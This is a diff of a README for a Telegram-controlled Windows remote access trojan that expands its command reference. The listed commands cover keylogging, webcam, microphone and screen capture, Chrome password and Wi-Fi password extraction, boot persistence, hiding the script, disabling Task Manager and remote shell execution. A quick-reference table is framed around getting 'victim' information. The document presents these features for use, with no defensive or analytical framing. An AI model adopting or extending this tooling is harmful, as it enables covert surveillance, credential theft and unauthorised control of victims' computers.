@@ -302,21 +302,28 @@ You can copy this single EXE file to any Windows computer and run it without ins
 
 5. Send any command from the list below
 
-### Authentication
+## Authentication
 | Command | Description |
 |---------|-------------|
-| `/start` | Connect to RAT |
+| `/start` | Connect to RAT with password |
 | `/help` | Show this help menu |
 
-### System Control
+## System Control
 | Command | Description |
 |---------|-------------|
-| `/addstartup` | Add to Windows startup |
+| `/addstartup` | Add to Windows startup (manual path) |
 | `/deletestartup` | Remove from Windows startup |
+| `/persistence` | Enable auto-start on boot (automatic) |
+| `/nopersistence` | Disable auto-start on boot |
+| `/hide` | Hide script file |
+| `/unhide` | Unhide script file |
 | `/run [path]` | Run a file |
 | `/sleep` | Put computer to sleep |
 | `/shutdown` | Shutdown computer |
 | `/restart` | Restart computer |
+| `/lockpc` | Lock computer screen |
+| `/logoff` | Log off current user |
+| `/hibernate` | Hibernate computer |
 | `/altf4` | Send Alt+F4 command |
 | `/cmdbomb` | Open 10 CMD windows |
 | `/block` | Block keyboard and mouse input |
@@ -324,103 +331,190 @@ You can copy this single EXE file to any Windows computer and run it without ins
 | `/disabletaskmgr` | Disable Task Manager |
 | `/enabletaskmgr` | Enable Task Manager |
 
-### Keylogger
+## System Information
+| Command | Description |
+|---------|-------------|
+| `/info` | Get IP address and geolocation |
+| `/pcinfo` | Detailed system information |
+| `/shortinfo` | Basic system information (user, PC, OS) |
+| `/sysinfo` | Complete system information (CPU, RAM, disk, battery) |
+| `/uptime` | Show system uptime |
+| `/users` | Show all PC users |
+| `/whoami` | Show current username |
+| `/apps` | Show installed applications |
+| `/batteryinfo` | Show battery status |
+
+## File Management
+| Command | Description |
+|---------|-------------|
+| `/files` | List files in current directory |
+| `/cd [path]` | Change current directory |
+| `/delete [path]` | Delete file or folder |
+| `/rename [old] [new]` | Rename file or folder |
+| `/mkdir [name]` | Create new directory |
+| `/rmdir [name]` | Remove empty directory |
+| `/search [name]` | Search files on C drive |
+| `/download [path]` | Download file from victim |
+| `/upload` | Upload file to victim (send via Telegram) |
+| `/downloadurl [url] [name]` | Download file from internet |
+| `/uploadfile [path]` | Upload any file to Telegram |
+| `/metadata [path]` | Show file metadata |
+| `/zip [folder]` | Create zip archive |
+| `/unzip [file]` | Extract zip archive |
+
+## Process Management
+| Command | Description |
+|---------|-------------|
+| `/tasklist` | Show running processes |
+| `/taskkill [name]` | Kill process by name |
+| `/processes` | Detailed process list with CPU/RAM usage |
+| `/killpid [pid]` | Kill process by ID |
+
+## Keylogger
 | Command | Description |
 |---------|-------------|
 | `/keylogstart` | Start keylogger |
 | `/keylogstop` | Stop keylogger |
 | `/keylogdump` | Download keylog file |
+| `/keylogscreenshot` | Take screenshot on each key press |
 
-### Surveillance
+## Surveillance
 | Command | Description |
 |---------|-------------|
 | `/screenshot` | Take screenshot |
+| `/screenrecord [sec]` | Record screen (default 10 sec) |
 | `/mic [sec]` | Record microphone (default 5 sec) |
 | `/webscreen` | Take webcam photo |
 | `/webcam [sec]` | Record webcam video (default 5 sec) |
-| `/screenrecord [sec]` | Record screen (default 10 sec) |
 
-### Information Gathering
+## Monitoring
 | Command | Description |
 |---------|-------------|
-| `/users` | Show all PC users |
-| `/whoami` | Show current username |
-| `/tasklist` | Show running processes |
-| `/taskkill [name]` | Kill a process by name |
+| `/clipboard` | Show current clipboard contents |
+| `/changeclipboard [text]` | Change clipboard contents |
+| `/clipmonstart` | Start clipboard monitoring |
+| `/clipmonstop` | Stop clipboard monitoring |
+| `/usbmonitorstart` | Monitor USB device insertion/removal |
+| `/usbmonitorstop` | Stop USB monitoring |
+| `/networkmonitorstart` | Monitor network connections |
+| `/networkmonitorstop` | Stop network monitoring |
+| `/netstat` | Show active network connections |
+
+## Network & Wi-Fi
+| Command | Description |
+|---------|-------------|
 | `/wifilist` | Show saved Wi-Fi networks |
 | `/wifipass [name]` | Show Wi-Fi password |
-| `/info` | Show IP address and location |
-| `/pcinfo` | Show detailed system info |
-| `/shortinfo` | Show basic system info |
-| `/apps` | Show installed applications |
-| `/batteryinfo` | Show battery status |
+| `/passwords` | Extract saved browser passwords (Chrome) |
+| `/chrome [url]` | Open URL in Chrome |
+| `/edge [url]` | Open URL in Edge |
+| `/firefox [url]` | Open URL in Firefox |
 
-### File Operations
-| Command | Description |
-|---------|-------------|
-| `/download [path]` | Download file from victim |
-| `/upload` | Upload file to victim |
-| `/metadata [path]` | Show file metadata |
-
-### Command Execution
-| Command | Description |
-|---------|-------------|
-| `/e [cmd]` | Execute command with output |
-| `/ex [cmd]` | Execute command (long output as file) |
-| `/execute` | Start interactive shell session |
-
-### Input Simulation
+## Input Control
 | Command | Description |
 |---------|-------------|
 | `/keytype [text]` | Type text |
 | `/keypress [key]` | Press a single key |
-| `/keypresstwo k1 k2` | Press two keys together |
-| `/keypressthree k1 k2 k3` | Press three keys together |
-| `/mousemove x y` | Move mouse to coordinates |
+| `/keypresstwo [k1] [k2]` | Press two keys together |
+| `/keypressthree [k1] [k2] [k3]` | Press three keys together |
+| `/mousemove [x] [y]` | Move mouse to coordinates |
 | `/mouseclick` | Left click at current position |
 | `/mouseright` | Right click at current position |
 | `/mousemesstart` | Start random mouse movement |
 | `/mousemesstop` | Stop random mouse movement |
 
-### Audio Control
+## Audio Control
 | Command | Description |
 |---------|-------------|
-| `/textspeech [text]` | Convert text to speech |
-| `/playsound [path]` | Play a sound file |
 | `/fullvolume` | Set volume to maximum |
 | `/volumeplus` | Increase volume by 10% |
 | `/volumeminus` | Decrease volume by 10% |
+| `/volume [0-100]` | Set specific volume level |
+| `/mute` | Mute system audio |
+| `/unmute` | Unmute system audio |
+| `/textspeech [text]` | Convert text to speech |
+| `/say [text]` | Text to speech (alias) |
+| `/playsound [path]` | Play audio file |
 
-### Window Control
+## Window Control
 | Command | Description |
 |---------|-------------|
 | `/maximize` | Maximize active window |
 | `/minimize` | Minimize active window |
 
-### Clipboard
+## Command Execution
 | Command | Description |
 |---------|-------------|
-| `/clipboard` | Show clipboard contents |
-| `/changeclipboard [text]` | Change clipboard contents |
+| `/e [cmd]` | Execute command (short output) |
+| `/ex [cmd]` | Execute command (long output as file) |
+| `/execute` | Start interactive shell session |
 
-### Browser
+## Messaging
 | Command | Description |
 |---------|-------------|
-| `/chrome [url]` | Open URL in Chrome |
-| `/edge [url]` | Open URL in Edge |
-| `/firefox [url]` | Open URL in Firefox |
+| `/msg [type] [title] [text]` | Show message box (types: info, warning, error, question) |
+| `/notify [title] [text]` | Show Windows notification |
 
-### Obfuscation
+## Scheduling
+| Command | Description |
+|---------|-------------|
+| `/schedule [seconds] [command]` | Schedule command execution |
+| `/listschedules` | List scheduled tasks |
+| `/clearschedules` | Clear all scheduled tasks |
+
+## Obfuscation
 | Command | Description |
 |---------|-------------|
 | `/hide` | Hide script file |
 | `/unhide` | Unhide script file |
 
-### Other
+## Other
 | Command | Description |
 |---------|-------------|
-| `/msg [type] [title] [text]` | Show message box (types: info, warning, error, question) |
-| `/wallpaper` | Change desktop wallpaper |
+| `/wallpaper` | Change desktop wallpaper (use with /upload first) |
+| `/msg [type] [title] [text]` | Show message box |
+
+---
+
+## Command Categories Summary
+
+| Category | Number of Commands |
+|----------|-------------------|
+| Authentication | 2 |
+| System Control | 19 |
+| System Information | 10 |
+| File Management | 14 |
+| Process Management | 4 |
+| Keylogger | 4 |
+| Surveillance | 6 |
+| Monitoring | 9 |
+| Network & Wi-Fi | 7 |
+| Input Control | 9 |
+| Audio Control | 9 |
+| Window Control | 2 |
+| Command Execution | 3 |
+| Messaging | 2 |
+| Scheduling | 3 |
+| Obfuscation | 2 |
+| Other | 2 |
+| **TOTAL** | **107** |
+
+---
+
+## Quick Reference - Most Used Commands
+
+| Purpose | Command |
+|---------|---------|
+| Get victim info | `/shortinfo` or `/sysinfo` |
+| Browse files | `/files` then `/cd [folder]` |
+| Download file | `/download [path]` |
+| Upload file | `/upload` then send file |
+| Execute command | `/e [command]` |
+| Take screenshot | `/screenshot` |
+| Start keylogger | `/keylogstart` |
+| Get Wi-Fi password | `/wifipass [name]` |
+| Lock computer | `/lockpc` |
+| Shutdown | `/shutdown` |
 
 ---
 
